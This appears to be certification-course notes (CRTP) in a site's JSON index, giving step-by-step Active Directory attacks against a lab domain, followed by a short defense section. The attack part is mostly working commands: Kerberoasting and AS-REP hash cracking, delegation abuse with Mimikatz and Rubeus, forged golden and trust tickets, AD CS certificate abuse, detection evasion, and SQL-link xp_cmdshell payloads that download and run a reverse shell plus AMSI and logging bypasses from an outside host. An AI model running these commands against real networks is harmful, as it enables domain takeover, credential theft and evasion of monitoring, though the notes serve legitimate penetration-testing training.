        "excerpt":"  Privesc - Kerberoast         Offline cracking of service account passwords.   The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.   Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!   Find user accounts used as Service accounts   ActiveDirectory module:  Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName   PowerView:  Get-DomainUser -SPN   Use Rubeus to list Kerberoast stats:  Rubeus.exe kerberoast /stats   Use Rubeus to request a TGS:  Rubeus.exe kerberoast /user:svcadmin /simple      To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac)    Look for Kerberoastable accounts that only support RC4_HMAC:  Rubeus.exe kerberoast /stats /rc4opsec Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec   Kerberoast all possible accounts:  Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt   Crack ticket using John the Ripper:  john.exe --wordlist=C:\\AD\\Tools\\kerberoast\\10k-worst-pass.txt C:\\AD\\Tools\\hashes.txt   Learning Objective 14      Using the Kerberoast attack, crack password of a SQL server service account.   Targeted Kerberoasting - AS-REPs      If a user’s UserAccountControl settings have Do not require Kerberos preauthentication enabled i.e. Kerberos preauth is disabled, its possible to grab user’s crackable AS-REP and brute-force it offline   With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well   Enumerating accounts with Kerberos Preauth disabled   Using PowerView:  Get-DomainUser -PreauthNotRequired -Verbose   Using ActiveDirectory module:  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth   Force disable Kerberos Preauth:   Let’s enumerate the permissions for RDPUsers on ACLs using PowerView:  Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"RDPUsers\"}  Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose Get-DomainUser -PreauthNotRequired -Verbose   Request encrypted AS-REP for offline brute-force   Let’s use ASREPRoast:  Get-ASREPHash -UserName VPN1user -Verbose   To enumerate all users with Kerberos preauth disabled and request a hash:  Invoke-ASREPRoast -Verbose   We can use John The Ripper to brute-force the hashes offline:  john.exe --wordlist=C:\\AD\\Tools\\kerberoast\\10k-worst-pass.txt C:\\AD\\Tools\\asrephashes.txt   Targeted Kerberoasting - Set SPN      With enough rights (GenericAll/GenericWrite), a target user’s SPN can be set to anything (unique in the domain)   We can then request TGS without special privileges. The TGS can then be Kerberoasted.   Let’s enumerate the permissions for RDPUsers on ACLs using PowerView:  Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"RDPUsers\"}   Using Powerview, see if the user already has a SPN:  Get-DomainUser -Identity supportuser | select serviceprincipalname   Using ActiveDirectory module:  Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName   Set a SPN for the user (must be unique for the domain)  Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}   Using ActiveDirectory module:  Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'}   Kerberoast the user:  Rubeus.exe kerberoast /outfile:targetedhashes.txt john.exe --wordlist=C:\\AD\\Tools\\kerberoast\\10k-worst-pass.txt C:\\AD\\Tools\\targetedhashes.txt   Kerberos Delegation   Only way to double hoping is:  - Explicit Credentials - CredSSP - Delegation      Kerberos Delegation allows to reuse the end-user credentials to access resources hosted on a different server.   This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.   For example, users authenticates to a web server and web server makes requests to a database server.   The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server’s service account.      Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.       A user provides credentials to the DomainController.   The DC returns a TGT.   The user requests a TGS for the web service on Web Server.   The DC provides a TGS.   The user sends the TGT and TGS to the web server.   The web server service account use the user’s TGT to request a TGS for the database server from the DC.   The web server service account connects to the database server as the user.      There are two types of Kerberos Delegation:           General/Basic or Unconstrained Delegation which allows the first hop server (web server in our example) to request access to any service on any computer in the domain.       Constrained Delegation which allows the first hop server (web server in our \texample) to request access only to specified services on specified computers.   If the user is not using Kerberos authentication to authenticate to the first hop\tserver, Windows offers Protocol Transition to transition the request to Kerberos.      Both types of delegations, a mechanism is required to impersonate the incoming user and authenticate to the second hop server (Database server in our example) as the user.    Privesc - Uncounstrained Delegation         When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user.   When unconstrained delegation is enabled, the DC places user’s TGT inside TGS (Step 4 in the previous diagram).   When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS.      This way the server can reuse the user’s TGT to access any other resource as the user    This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine.   Discover domain computers which have unconstrained delegation enabled using PowerView:  Get-DomainComputer -UnConstrained   Using ActiveDirectory module:  Get-ADComputer -Filter {TrustedForDelegation -eq $True} Get-ADUser -Filter {TrustedForDelegation -eq $True}   Compromise the server(s) where Unconstrained delegation is enabled.      We must trick or wait for a domain admin to connect a service on appsrv.   Now, if the command is run again:  Invoke-Mimikatz -Command '\"sekurlsa::tickets /export\"'   The DA token could be reused:  Invoke-Mimikatz -Command '\"kerberos::ptt C:\\Users\\appadmin\\Documents\\user1\\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi\"'   Printer Bug      How do we trick a high privilege user to connect to a machine with Unconstrained Delegation? The Printer Bug!   A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user’s choice.   We can force the dcorp-dc to connect to dcorp-appsrv by abusing the Printer bug.      We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:  Rubeus.exe monitor /interval:5 /nowrap   And after that run MS-RPRN.exe:   SpoolSample on GitHub   MS-RPRN.exe \\\\dcorp-dc.dollarcorp.moneycorp.local \\\\dcorp-appsrv.dollarcorp.moneycorp.local   If you are attacking from a Linux machine, check out Coercer:   Coercer on GitHub   We can also use PetitPotam.exe:   PetitPotam on GitHub    .\\PetitPotam.exe us-web us-dc   On us-web:  .\\Rubeus.exe monitor /interval:5      PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn’t need credentials when used against a DC.    Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:  Rubeus.exe ptt /ticket:   Or use Invoke-Mimikatz:  [IO.File]::WriteAllBytes(\"C:\\AD\\Tools\\USDC.kirbi\", [Convert]::FromBase64String(\"ticket_from_Rubeus_monitor\")) Invoke-Mimikatz -Command '\"kerberos::ptt C:\\AD\\Tools\\USDC.kirbi\"'   Once the ticket is injected, run DCSync:  Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'   Learning Objective 15      Find a server in dcorp domain where Unconstrained Delegation is enabled.   Compromise the server and escalate to Domain Admin privileges.   Escalate to Enterprise Admins privileges by abusing Printer Bug!   Contrained Delegation   Constrained Delegation when enabled on a service account, allows access only to specified services on specified computers as a user.      A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user’s authorization.   To impersonate the user, Service for User (S4U) extension is used which provides two extensions:   – Service for User to Self (S4U2self)  # Allows a service to obtain a forwardable TGS to itself on behalf of a user.  – Service for User to Proxy (S4U2proxy)  # Allows a service to obtain a TGS to a second service on behalf of a user.      SeEnableDelegation privileges are needed to configure Constrained Delegation.    Two ways to configure constrained delegation:  Kerberos only: Kerberos authentication is needed for the service to delegate. Protocol transition: Regardless of authentication the service can delegate.   To impersonate the user, Service for User (S4U) extension is used which provides two extensions:   – Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password.  # The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute.  – Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user.  # Which second service? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.         A user - Joe, authenticates to the web service (running with service account websvc) using a non-Kerberos compatible authentication mechanism.   The web service requests a ticket from the Key Distribution Center (KDC) for Joe’s account without supplying a password, as the websvc account.   The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that Joe’s account is not blocked for delegation. If OK it returns a forwardable ticket for Joe’s account (S4U2Self).   The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service.   The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a service ticket for dcorp-mssql (S4U2Proxy).   The web service can now authenticate to the CIFS on dcorp-mssql as Joe using the supplied TGS.      To abuse constrained delegation in above scenario, we need to have access to the websvc account.  If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.    Discover Constrained Delegation   Enumerate users and computers with constrained delegation enabled   Using PowerView:  Get-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth   Using ActiveDirectory module:  Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo   Kekeo   Abusing with Kekeo      Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc’s hash from dcorp-adminsrv   Using asktgt from Kekeo, we request a TGT (steps 2 &amp; 3 in the diagram):  kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f   Using s4u from Kekeo, we request a TGS (steps 4 &amp; 5):  tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL   Using mimikatz, inject the ticket:  Invoke-Mimikatz -Command '\"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi\"' \t ls \\\\dcorp-mssql.dollarcorp.moneycorp.local\\c$   Rubeus   Abusing with Rubeus   We can use the following command (We are requesting a TGT and TGS in a single command):  Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt  ls \\\\dcorp-mssql.dollarcorp.moneycorp.local\\c$      Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.       This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service!    Kekeo   Abusing with Kekeo   Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash   Using asktgt from Kekeo, we request a TGT:  tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67   Using s4u from Kekeo_one (no SNAME validation):  tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi/user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL   Using mimikatz:  Invoke-Mimikatz -Command '\"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi\"'    Invoke-Command -ScriptBlock{whoami} -ComputerName us-mssql.us.techcorp.local    Invoke-Mimikatz -Command '\"lsadump::dcsync/user:dcorp\\krbtgt\"'   Rubeus   Abusing with Rubeus   We can use the following command (We are requesting a TGT and TGS in a single command):  Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator/msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt   After injection, we can run DCSync:  C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\"  OR  Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt  winrs -r:us-mssql cmd.exe   Learning Objective 16   Enumerate users in the domain for whom Constrained Delegation is enabled:      For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.   Pass the ticket and access the service as DA.   Enumerate computer accounts in the domain for which Constrained Delegation is enabled:      For such a user, request a TGT from the DC.   Use the TGS for executing the DCSync attack   Resource-based Constrained Delegation      This moves delegation authority to the resource/service administrator.       Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service.   That is the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins.   To abuse RBCD in the most effective form, we just need two privileges:      Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.   Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain -ms-DS-MachineAccountQuota is 10 for all domain users)   We already have admin privileges on student VMs that are domain joined machines.   Enumeration would show that the user ciadmin has Write permissions over the dcorp-mgmt machine!  Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}   Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for student machines:  $comps = 'dcorp-student1$','dcorp-student2$' Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps   Now, let’s get the privileges of dcorp-studentx$ by extracting its AES keys:  Invoke-Mimikatz -Command '\"sekurlsa::ekeys\"'   Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-mgmt as ANY user we want:  Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt  winrs -r:dcorp-mgmt cmd.exe   Learning Objective 17      Find a computer object in dcorp domain where we have Write permissions.   Abuse the Write permissions to access that computer as Domain Admin.      More info about Constrained Delegation - Kerberos Only in CRTE       I’ll publish later, dont worry ;)    Privesc - Across Trusts      Across Domains - Implicit two way trust relationship.   Across Forests - Trust relationship needs to be established.   Child to Parent      sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user’s domain is changed, they get a new SID and the old SID is added to sIDHistory.   sIDHistory can be abused in two ways of escalating privileges within a forest:  - krbtgt hash of the child - Trust tickets   Child to Parent Trust Flow      Child to Parent:      Child to Parent using Trust Tickets   So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent:  Invoke-Mimikatz -Command '\"lsadump::trust /patch\"' -ComputerName dcorp-dc  or  Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\mcorp$\"'  or  Invoke-Mimikatz -Command '\"lsadump::lsa /patch\"'   We can forge and inter-realm TGT:  C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\\AD\\Tools\\trust_tkt.kirbi\" \"exit\"      Abuse with Kekeo   Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket:  .\\asktgs.exe C:\\AD\\Tools\\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local   Use the TGS to access the targeted service:  .\\kirbikator.exe lsa .\\CIFS.mcorp-dc.moneycorp.local.kirbi ls \\\\mcorp-dc.moneycorp.local\\c$      Tickets for other services (like HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM) can be created as well.    Abuse with Rubeus   Note that we are still using the TGT forged initially:  Rubeus.exe asktgs /ticket:C:\\AD\\Tools\\kekeo_old\\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt  ls \\\\mcorp-dc.moneycorp.local\\c$   Learning Objective 18      Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.   Child to Parent using krbtgt hash   We will abuse sIDhistory once again:  Invoke-Mimikatz -Command '\"lsadump::lsa /patch\"' C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-\t5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt\" \"exit\"      In the above command, the mimkatz option /sids is forcefully setting the sIDHistory for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group.    On any machine of the current domain:  Invoke-Mimikatz -Command '\"kerberos::ptt C:\\AD\\Tools\\krbtgt_tkt.kirbi\"' ls \\\\mcorp-dc.moneycorp.local.kirbi\\c$  gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local  C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:mcorp\\krbtgt /domain:moneycorp.local\" \"exit\"   Avoid suspicious logs by using Domain Controllers group:  C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9  /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt\" \"exit\"  C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:mcorp\\krbtgt /domain:moneycorp.local\" \"exit\"      S-1-5-21-2578538781-2508153159-3419410681-516 - Domain Controllers S-1-5-9 - Enterprise Domain Controllers    Learning Objective 19      Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp’s krbtgt hash.   Trust Flow Across Forest      Trust Abuse Across Forest      Across Forest using Trust Tickets   Once again, we require the trust key for the inter-forest trust:     → Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'  Or  Invoke-Mimikatz -Command '\"lsadump::lsa /patch\"'  Or  Invoke-Mimikatz -Command '\"lsadump::dcsync /user:eu\\euvendor$\"'   An inter-forest TGT can be forged:  C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:2756bdf7dd8ba8e9c40fe60f654115a0 /service:krbtgt /target:eurocorp.local /ticket:C:\\AD\\Tools\\trust_forest_tkt.kirbi\" \"exit\"   Abuse with Kekeo   Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket:  .\\asktgs.exe C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local   Use the TGS to access the targeted service:  .\\kirbikator.exe lsa .\\CIFS.eurocorp-dc.eurocorp.local.kirbi ls \\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\      Tickets for other services (like HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM) can be created as well    Abuse with Rubeus   Using the same TGT which we forged earlier:  Rubeus.exe asktgs /ticket:C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt ls \\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\   net view \\\\&lt;domain&gt;   # This can enum the shares   Learning Objective 20      With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest   Across domain trusts - AD CS  Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.      AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.        AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization.       CA - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.   Certificate - Issued to a user or machine and can be used for authentication, encryption, signing etc.   CSR - Certificate Signing Request made by a client to the CA to request a certificate.   Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.   EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)      There are various ways of abusing ADCS! (See the link to “Certified Pre-Owned” paper in slide notes):  - Extract user and machine certificates - Use certificates to retrieve NTLM hash - User and machine level persistence - Escalation to Domain Admin and Enterprise Admin - Domain persistence      We will not discuss all of the techniques!          We can use the Certify tool to enumerate (and for other attacks) AD CS in the target forest:   Certify on GitHub  Certify.exe cas   Enumerate the templates:  Certify.exe find ```powershell  Enumerate vulnerable templates: ```powershell Certify.exe find /vulnerable      In moneycorp, there are multiple misconfigurations in AD CS.   Common requirements/misconfigurations for all the Escalations that we have in the lab (ESC1, ESC3 and ESC6):  - CA grants normal/low-privileged users enrollment rights - Manager approval is disabled - Authorization signatures are not required - The target template grants normal/low-privileged users enrollment rights   AD CS - ESC3   The template SmartCardEnrollment-Agent allows Domain users to enroll and has Certificate Request Agent EKU:  Certify.exe find /vulnerable   The template SmartCardEnrollment-Users has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication. Search for domain authentication EKU:  Certify.exe find /json /outfile:C:\\AD\\Tools\\file.json ((Get-Content C:\\AD\\Tools\\file.json | ConvertFrom-Json).CertificateTemplates | ? {$_.ExtendedKeyUsage -contains \"1.3.6.1.5.5.7.3.2\"}) | fl *   Escalation to DA  We can now request a certificate for Certificate Request Agent from SmartCardEnrollment-Agent template:  Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA/template:SmartCardEnrollment-Agent   Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the SmartCardEnrollment-Users template:  Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA/template:SmartCardEnrollment-Users /onbehalfof:dcorp\\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123   Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it:  Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt   Escalation to EA  Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of EA using the SmartCardEnrollment-Users template:  Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123   Request EA TGT and inject it:  Rubeus.exe asktgt /user:moneycorp.local\\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt   AD CS - ESC6   The CA in moneycorp has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This means that we can request a certificate for ANY user from a template that allow enrollment for normal/low-privileged users:  Certify.exe find   The template CA-Integration grants enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx:  Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:\"CA-Integration\" /altname:administrator   Convert from cert.pem to pfx (esc6.pfx below) and use it to request a TGT for DA (or EA):  Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt   AD CS - ESC1   The template HTTPSCertificates has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag:  Certify.exe find /enrolleeSuppliesSubject   The template HTTPSCertificates allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx:  Certify.exe request /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA /template:\"HTTPSCertificates\" /altname:administrator   Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA):  Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt   Learning Objective 21      Check if AD CS is used by the target forest and find any vulnerable/abusable templates.   Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.   Trust Abuse - MSSQL Servers  MS SQL servers are generally deployed in plenty in a Windows domain.      SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.   For MSSQL and PowerShell hackery, lets use PowerUpSQL   PowerUpSQL on GitHub   Discovery (SPN Scanning):  Get-SQLInstanceDomain   Check Accessibility:  Get-SQLConnectionTestThreaded Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose   Gather Information:  Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose   MSSQL Servers - Database Links  A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.      In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.   Database links work even across forest trusts.   Searching Database Links   Look for links to remote servers:  Get-SQLServerLink -Instance dcorp-mssql -Verbose  Or  select * from master..sysservers   Enumerating Database Links - Manually   Openquery() function can be used to run queries on a linked database:  select * from openquery(\"dcorp-sql1\",'select * from master..sysservers')   Enumerating Database Links:  Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose  or   Openquery queries can be chained to access links within links (nested links)  select * from openquery(\"dcorp-sql1\",'select * from openquery(\"dcorp-mgmt\",''select * from master..sysservers'')')   Executing Commands   On the target server, either xp_cmdshell should be already enabled; or If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:  EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT \"eu-sql\"   Executing Commands   From the initial SQL server, OS commands can be executed using nested link queries:  select * from openquery(\"192.168.23.25\",'select * from openquery(\"db-sqlsrv\",''select @@version as version;exec master..xp_cmdshell \"powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')\"'')')   Abusing Database Links   Crawling links to remote servers:  Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local   Abusing links to remote servers (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)  Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami''' -QueryTarget db-sqlsrv   Executing Commands   Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain):  Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget eu-sql   From the initial SQL server, OS commands can be executed using nested link queries:  select * from openquery(\"dcorp-sql1\",'select * from openquery(\"dcorp-mgmt\",''select * from openquery(\"eu-sql.eu.eurocorp.local\",''''select @@version as version;exec master..xp_cmdshell \"powershell whoami)'''')'')')   Learning Objective 22      Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql   Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c \"iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)   ","categories": ["notes","crtp"],
        "tags": ["begginer","AD","Windows","privesc"],
        "url": "/notes/crtp/domprivesc/",
        "teaser": "/assets/images/posts/crtp/crtp-teaser7.jpg"
      },{
        "title": "7 - AD Defense",
        "excerpt":"  Detection and Defense      Protect and Limit Domain Admins   Isolate administrative workstations   Secure local administrators   Time bound and just enough administration   Isolate administrators in a separate forest and breach containment using Tiers and ESAE   Protect and Limit Domain Admins      Reduce the number of Domain Admins in your environment.   Do not allow or limit login of DAs to any other machine other than the Domain Controllers. If logins to some servers is necessary, do not allow other administrators to login to that machine.   (Try to) Never run a service with a DA. Credential theft protections which we are going to discuss soon are rendered useless in case of a service account.      Set Account is sensitive and cannot be delegated for DAs.    Protected Users Group   Protected Users is a group introduced in Server 2012 R2 for better protection against credential theft by not caching credentials in insecure ways. A user added to this group has following major device protections:      Cannot use CredSSP and WDigest - No more cleartext credentials caching.   NTLM hash is not cached.   Kerberos does not use DES or RC4 keys. No caching of clear text cred or long term keys.   If the domain functional level is Server 2012 R2, following DC protections are available:      No NTLM authentication.   No DES or RC4 keys in Kerberos pre-auth.   No delegation (constrained or unconstrained)        No renewal of TGT beyond initial four hour lifetime - Hardcoded, unconfigurable Maximum lifetime for user ticket and Maximum lifetime for user ticket renewal       Needs all domain control to be at least Server 2008 or later (because AES keys).   Not recommended by MS to add DAs and EAs to this group without testing “the potential impact” of lock out.   No cached logon ie.e no offline sign-on.   Having computer and service accounts in this group is useless as their credentials will always be present on the host machine.   Isolate administrative workstations   Privileged Administrative Workstations (PAWs)      A hardened workstation for performing sensitive tasks like administration of domain controllers, cloud infrastructure, sensitive business functions etc.   Can provides protection from phishing attacks, OS vulnerabilities, credential replay attacks.   Admin Jump servers to be accessed only from a PAW, multiple strategies   - Separate privilege and hardware for administrative and normal tasks. - Having a VM on a PAW for user tasks.   Secure local administrators   LAPS (Local Administrator Password Solution)      Centralized storage of passwords in AD with periodic randomizing where read permissions are access controlled.  